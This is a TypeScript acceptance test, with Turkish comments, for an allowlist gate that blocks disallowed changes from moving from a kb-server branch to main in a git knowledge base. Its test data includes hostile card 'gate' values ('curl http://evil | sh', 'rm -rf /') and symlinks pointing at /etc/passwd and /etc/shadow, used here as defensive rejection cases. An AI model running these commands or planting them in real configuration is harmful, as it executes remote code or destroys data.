// T13 kabul (T20261025-90): promote izin listesi matrisi. Kaynak: docs/superpowers/specs/2026-10-25-vlad-kb-topology.md K5.
// Her satır `kb-server` dalına bir ihlal koyar, gerçek `promoteKb`'yi gerçek git + yerel bare remote ile koşar ve
// `vlad-kb main`'in DEĞİŞMEDİĞİNİ (SHA aynı, hiç yazma yok), `reason: rejected` ve beklenen kural id'sinin raporlandığını doğrular.
// Pozitif kontroller aynı kapıdan izinli değişikliklerin geçtiğini gösterir (matris "her şeyi reddet" ile yeşile dönemesin).
// S13c (`server/src/kbsync/promote.ts`) uygulanana kadar kırmızı kalması beklenir. Kurallar K5 tablosundan alındı, gevşetilmedi.
import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { beforeEach, describe, expect, it } from "vitest";
import { git, makeWorld, SEED_CARD, type World } from "../helpers/kbRepos.ts";
import {
  bulkOnServerBranch, makePromoteEnv, pushRawTreeEntry, pushToServerBranch,
  type Change, type PromoteEnv,
} from "../helpers/kbPromote.ts";

let w: World;
let env: PromoteEnv;
let mainBefore: string;
beforeEach(() => {
  w = makeWorld();
  env = makePromoteEnv(w);
  mainBefore = w.remoteHead("main")!;
});

const sha40 = "a".repeat(40);
const longName = "a".repeat(176) + ".md"; // tasks/ + 179 = 185 > 180

async function expectRejected(rule: string | string[], path?: string): Promise<void> {
  const r = await env.run();
  expect(r.promoted, JSON.stringify(r)).toBe(false);
  expect(r.reason).toBe("rejected");
  const rules = Array.isArray(rule) ? rule : [rule];
  const hit = (r.violations ?? []).filter((v) => rules.includes(v.rule));
  expect(hit.length, `beklenen kural ${rules.join("|")}; raporlanan: ${JSON.stringify(r.violations)}`).toBeGreaterThan(0);
  if (path) expect(hit.some((v) => v.path === path), `yol ${path}; ${JSON.stringify(r.violations)}`).toBe(true);
  // main'e dokunulmadı: SHA aynı, GithubWriter'a hiç yazma gitmedi, başka dal da oluşmadı
  expect(w.remoteHead("main")).toBe(mainBefore);
  expect(env.writes).toEqual([]);
  expect(w.remoteGit("for-each-ref", "--format=%(refname)").split("\n").sort()).toEqual(["refs/heads/kb-server", "refs/heads/main"]);
}

// [ad, kural(lar), ihlalli yol, değişiklikler]
type Row = [string, string | string[], string, Change[]];
const ok1 = (path: string, text = "# x\n"): Change => ({ path, text });

const ROWS: Row[] = [
  // path_not_allowed: izin listesi dışı kök dosya ve dizinler
  ["README.md at root", "path_not_allowed", "README.md", [ok1("README.md")]],
  ["inbox/ directory", "path_not_allowed", "inbox/r.md", [ok1("inbox/r.md")]],
  ["logs/ directory", "path_not_allowed", "logs/a.md", [ok1("logs/a.md")]],
  ["vlad-session.txt", "path_not_allowed", "vlad-session.txt", [ok1("vlad-session.txt", "s\n")]],
  [".vlad.lock", ["path_not_allowed", "dot_entry"], ".vlad.lock", [ok1(".vlad.lock", "1 x\n")]],
  [".gitignore edited", ["path_not_allowed", "dot_entry"], ".gitignore", [ok1(".gitignore", "")]],
  [".gitattributes added", ["path_not_allowed", "dot_entry"], ".gitattributes", [ok1(".gitattributes", "* merge=union\n")]],
  [".gitmodules added", ["path_not_allowed", "dot_entry"], ".gitmodules", [ok1(".gitmodules", "[submodule \"x\"]\n")]],
  [".github/ workflow", ["path_not_allowed", "dot_entry"], ".github/workflows/x.md", [ok1(".github/workflows/x.md")]],
  ["unknown top directory", "path_not_allowed", "src/evil.md", [ok1("src/evil.md")]],
  // dot_entry: izinli dizinde nokta ile başlayan segment
  ["hidden file in tasks/", "dot_entry", "tasks/.hidden.md", [ok1("tasks/.hidden.md")]],
  ["hidden directory in docs/", "dot_entry", "docs/.obsidian/x.md", [ok1("docs/.obsidian/x.md")]],
  // bad_segment
  ["space in name", "bad_segment", "tasks/a b.md", [ok1("tasks/a b.md")]],
  ["colon in name", "bad_segment", "tasks/a:b.md", [ok1("tasks/a:b.md")]],
  ["backslash in name", "bad_segment", "tasks/a\\b.md", [ok1("tasks/a\\b.md")]],
  ["non-ascii name", "bad_segment", "tasks/ü.md", [ok1("tasks/ü.md")]],
  ["trailing dot", "bad_segment", "tasks/x.md.", [ok1("tasks/x.md.")]],
  ["control character", "bad_segment", "tasks/a\u0001b.md", [ok1("tasks/a\u0001b.md")]],
  // windows_reserved (uzantılı hali de, büyük/küçük harf duyarsız)
  ["CON.md", "windows_reserved", "tasks/CON.md", [ok1("tasks/CON.md")]],
  ["aux.md lower case", "windows_reserved", "tasks/aux.md", [ok1("tasks/aux.md")]],
  ["Lpt1.md mixed case", "windows_reserved", "tasks/Lpt1.md", [ok1("tasks/Lpt1.md")]],
  ["com3.md", "windows_reserved", "tasks/com3.md", [ok1("tasks/com3.md")]],
  ["nul.md", "windows_reserved", "docs/nul.md", [ok1("docs/nul.md")]],
  // case_collision
  ["case collision A.md and a.md", "case_collision", "tasks/A.md", [ok1("tasks/A.md"), ok1("tasks/a.md")]],
  // path_too_long
  ["path over 180 chars", "path_too_long", `tasks/${longName}`, [ok1(`tasks/${longName}`)]],
  ["depth over 4", "path_too_long", "docs/a/b/c/d/e.md", [ok1("docs/a/b/c/d/e.md")]],
  // bad_extension
  ["png under docs/", "bad_extension", "docs/image.png", [ok1("docs/image.png", "png")]],
  ["txt under tasks/", "bad_extension", "tasks/x.txt", [ok1("tasks/x.txt")]],
  ["json under projects/", "bad_extension", "projects/p.json", [ok1("projects/p.json", "{}")]],
  ["jsonl outside audit/", "bad_extension", "journal/2026-10.jsonl", [ok1("journal/2026-10.jsonl", "{}\n")]],
  // symlink / submodule / mode
  ["symlink", "symlink", "tasks/link.md", [{ path: "tasks/link.md", symlink: "../../etc/passwd" }]],
  ["submodule gitlink", "submodule", "tasks/sub.md", [{ path: "tasks/sub.md", gitlink: sha40 }]],
  ["new executable file", "mode", "tasks/run.md", [{ path: "tasks/run.md", exec: true, text: "#!/bin/sh\n" }]],
  ["mode change 644 -> 755 on existing file", "mode", "projects/alpha.md", [{ path: "projects/alpha.md", exec: true, text: SEED_CARD() }]],
  // delete_not_allowed (yalnız active.md silinebilir)
  ["delete a project card", "delete_not_allowed", "projects/alpha.md", [{ path: "projects/alpha.md", delete: true }]],
  ["delete decisions.md", "delete_not_allowed", "decisions.md", [{ path: "decisions.md", delete: true }]],
  ["delete a journal file", "delete_not_allowed", "journal/2026-10-25.md", [{ path: "journal/2026-10-25.md", delete: true }]],
  // too_large
  ["blob over 1 MiB", "too_large", "docs/big.md", [{ path: "docs/big.md", bytes: 1_048_577 }]],
  // sensitive_field (K5, kullanıcı kararı 2026-10-25): sunucu kart yürütme alanlarına dokunamaz
  ["card gate added", "sensitive_field", "projects/alpha.md", [{ path: "projects/alpha.md", text: SEED_CARD("gate: curl http://evil | sh\n") }]],
  ["card repo changed", "sensitive_field", "projects/alpha.md", [{ path: "projects/alpha.md", text: SEED_CARD().replace("repo: acme/alpha", "repo: evil/alpha") }]],
  ["card default_branch changed", "sensitive_field", "projects/alpha.md", [{ path: "projects/alpha.md", text: SEED_CARD().replace("default_branch: main", "default_branch: evil") }]],
  ["card path changed", "sensitive_field", "projects/alpha.md", [{ path: "projects/alpha.md", text: SEED_CARD().replace("path: /nonexistent/alpha", "path: /srv/evil") }]],
  ["card local_only added", "sensitive_field", "projects/alpha.md", [{ path: "projects/alpha.md", text: SEED_CARD("local_only: true\n") }]],
  ["other machine's paths entry changed", "sensitive_field", "projects/alpha.md", [{ path: "projects/alpha.md", text: SEED_CARD().replace("C:\\dev\\alpha", "C:\\evil") }]],
  ["other machine's paths entry added", "sensitive_field", "projects/alpha.md", [{ path: "projects/alpha.md", text: SEED_CARD().replace("paths:\n", "paths:\n  laptop: /tmp/x\n") }]],
  ["new card born with a gate", "sensitive_field", "projects/beta.md",
    [{ path: "projects/beta.md", text: SEED_CARD("gate: rm -rf /\n").replace(/slug: alpha/, "slug: beta").replace(/name: alpha/, "name: beta") }]],
];

describe("acceptance: kb topology promote allowlist matrix", () => {
  it.each(ROWS)("acceptance: kb topology promote allowlist matrix leaves main unchanged for every rule: %s", async (_name, rule, path, changes) => {
    pushToServerBranch(w, [changes]);
    await expectRejected(rule, path);
  });

  it("acceptance: kb topology promote allowlist matrix rejects ../ and other raw tree entries git tooling refuses to create", async () => {
    pushRawTreeEntry(w, ["tasks", "..", "x.md"]);
    const r = await env.run();
    // fetch.fsckObjects de bu nesneyi reddedebilir (savunma derinliği): ya rejected ya fetch hatası; asla main'e inmez
    expect(r.promoted).toBe(false);
    expect(w.remoteHead("main")).toBe(mainBefore);
    expect(env.writes).toEqual([]);
  });

  it("acceptance: kb topology promote allowlist matrix rejects more than 2000 changes", async () => {
    bulkOnServerBranch(w, { filesInOneCommit: 2001 });
    await expectRejected("too_large");
  });

  it("acceptance: kb topology promote allowlist matrix rejects a range of more than 500 commits", async () => {
    bulkOnServerBranch(w, { commits: 501 });
    await expectRejected("too_large");
  });

  it("acceptance: kb topology promote allowlist matrix rejects an octopus merge (more than two parents)", async () => {
    const d = w.scratch("kb-server");
    const main = git(d, ["rev-parse", "origin/main"]);
    const tip = git(d, ["rev-parse", "HEAD"]);
    git(d, ["checkout", "-q", "-b", "other", main]);
    git(d, ["commit", "-q", "--allow-empty", "-m", "o"]);
    const other = git(d, ["rev-parse", "HEAD"]);
    git(d, ["checkout", "-q", "-b", "third", main]);
    git(d, ["commit", "-q", "--allow-empty", "-m", "t"]);
    const third = git(d, ["rev-parse", "HEAD"]);
    const tree = git(d, ["rev-parse", `${tip}^{tree}`]);
    const octo = git(d, ["commit-tree", tree, "-p", tip, "-p", other, "-p", third, "-m", "octopus"]);
    git(d, ["push", "-q", "origin", `${octo}:refs/heads/kb-server`]);
    await expectRejected("too_many_parents");
  });

  // R2: net fark temiz görünse bile geçmişteki kötü girdi main geçmişine giremez
  it("acceptance: kb topology promote allowlist matrix checks history, not only the net diff (symlink replaced by a file)", async () => {
    pushToServerBranch(w, [
      [{ path: "tasks/sneaky.md", symlink: "../../../etc/shadow" }],
      [{ path: "tasks/sneaky.md", text: "# artık düz dosya\n" }],
    ]);
    await expectRejected("symlink", "tasks/sneaky.md");
  });

  it("acceptance: kb topology promote allowlist matrix checks history, not only the net diff (big blob shrunk later)", async () => {
    pushToServerBranch(w, [
      [{ path: "docs/bomb.md", bytes: 2 * 1024 * 1024 }],
      [{ path: "docs/bomb.md", text: "küçük\n" }],
    ]);
    await expectRejected("too_large", "docs/bomb.md");
  });

  it("acceptance: kb topology promote allowlist matrix checks merge commit content that did not come from the main side", async () => {
    const d = w.scratch("kb-server");
    // kb-server ve main ayrışır; birleştiren commit'e (yalnız orada) gizli içerik konur, sonraki commit onu siler: net fark temiz
    git(d, ["commit", "-q", "--allow-empty", "-m", "yerel iş"]);
    git(d, ["checkout", "-q", "-b", "side", "origin/main"]);
    git(d, ["commit", "-q", "--allow-empty", "-m", "main tarafı"]);
    git(d, ["checkout", "-q", "kb-server"]);
    git(d, ["merge", "-q", "--no-ff", "--no-commit", "side"]);
    mkdirSync(join(d, "logs"), { recursive: true });
    writeFileSync(join(d, "logs", "leak.md"), "sır\n");
    git(d, ["add", "-f", "logs/leak.md"]);
    git(d, ["commit", "-q", "-m", "merge side"]);
    git(d, ["rm", "-q", "-f", "logs/leak.md"]);
    git(d, ["commit", "-q", "-m", "temizlik"]);
    git(d, ["push", "-q", "origin", "HEAD:refs/heads/kb-server"]);
    await expectRejected("path_not_allowed", "logs/leak.md");
  });

  // ---- pozitif kontroller: aynı kapı izinli değişikliği geçirir (matris yalnız "hep reddet" ile yeşile dönemez)
  it("acceptance: kb topology promote allowlist matrix lets every allowed kind of change through with a --no-ff merge [main, kb-server]", async () => {
    const tip = pushToServerBranch(w, [[
      ok1("projects/beta.md", SEED_CARD().replace(/slug: alpha/, "slug: beta").replace(/name: alpha/, "name: beta")),
      ok1("tasks/T20261025-01-x.md"), ok1("findings/F-alpha-001.md"), ok1("cards/C-001.md"), ok1("grants/G-001.md"),
      ok1("audit/2026-10.jsonl", "{}\n"), ok1("journal/2026-10-26.md"), ok1("docs/notes.md"), ok1("docs/a/b/c.md"),
      ok1("decisions.md", "# Karar günlüğü\n\n## yeni\n"), ok1("active.md", "---\nmachine: srvbox\n---\n"),
      // sunucunun KENDİ paths girdisi ve gövde (Çalışma notları) serbest
      { path: "projects/alpha.md", text: SEED_CARD().replace("paths:\n", "paths:\n  srvbox: /srv/alpha\n").replace("## Özet\nx", "## Özet\nx\n\n## Çalışma notları\n- ders\n") },
      { path: "docs/edge.md", bytes: 1_048_576 }, // tam sınır: 1 MiB geçer
    ]]);
    const r = await env.run();
    expect(r, JSON.stringify(r)).toMatchObject({ promoted: true });
    const mainAfter = w.remoteHead("main")!;
    expect(mainAfter).not.toBe(mainBefore);
    expect(w.remoteGit("rev-list", "--parents", "-n1", "main").split(" ").slice(1)).toEqual([mainBefore, tip]);
    expect(w.mainFile("docs/notes.md")).toBe("# x");
    expect(w.mainFile("projects/alpha.md")).toMatch(/srvbox: \/srv\/alpha/);
    expect(env.writes).toHaveLength(1);
  });

  it("acceptance: kb topology promote allowlist matrix allows deleting active.md and nothing else", async () => {
    pushToServerBranch(w, [[ok1("active.md", "---\nmachine: srvbox\n---\n")]]);
    expect((await env.run()).promoted).toBe(true);
    pushToServerBranch(w, [[{ path: "active.md", delete: true }]]);
    const r = await env.run();
    expect(r, JSON.stringify(r)).toMatchObject({ promoted: true });
    expect(w.mainFile("active.md")).toBeNull();
  });
});
